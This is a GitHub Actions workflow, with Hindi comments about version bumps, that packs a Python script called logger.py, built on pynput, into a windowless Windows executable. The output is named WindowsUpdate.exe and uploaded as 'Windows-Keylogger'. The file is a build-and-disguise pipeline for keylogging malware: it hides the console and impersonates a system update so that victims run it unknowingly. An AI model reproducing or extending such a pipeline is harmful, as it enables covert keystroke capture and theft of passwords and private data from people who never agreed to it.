name: Build Windows Executable

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4  # <-- v3 से v4 में अपडेट किया

    - name: Set up Python
      uses: actions/setup-python@v5  # <-- v4 से v5 में अपडेट किया
      with:
        python-version: '3.10'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller pynput

    - name: Build the executable
      run: pyinstaller --onefile --noconsole --name WindowsUpdate logger.py

    - name: Upload artifact
      uses: actions/upload-artifact@v4  # <-- यह है मुख्य बदलाव, v3 से v4
      with:
        name: Windows-Keylogger
        path: dist/WindowsUpdate.exe
